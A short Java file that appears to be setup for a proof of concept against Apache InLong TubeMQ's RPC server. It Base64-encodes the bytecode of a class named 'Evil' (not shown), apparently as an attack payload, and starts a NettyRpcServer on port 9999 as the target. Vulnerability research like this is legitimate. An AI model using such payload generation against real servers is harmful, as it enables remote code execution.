import javassist.ClassPool;
import javassist.CtClass;
import org.apache.inlong.tubemq.corerpc.RpcConfig;
import org.apache.inlong.tubemq.corerpc.netty.NettyRpcServer;
import org.springframework.util.Base64Utils;


/**
 * @author by RacerZ
 * @date 2024/1/14.
 */
public class Main {
    static {
        ClassPool pool = ClassPool.getDefault();
        try {
            CtClass ctClass = pool.get(Evil.class.getName());
            System.out.println(Evil.class.getName());
            byte[] bytecode = ctClass.toBytecode();
            System.out.println(Base64Utils.encodeToString(bytecode));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) throws Throwable {
        NettyRpcServer server = new NettyRpcServer(new RpcConfig());
        server.start(9999);
    }
}
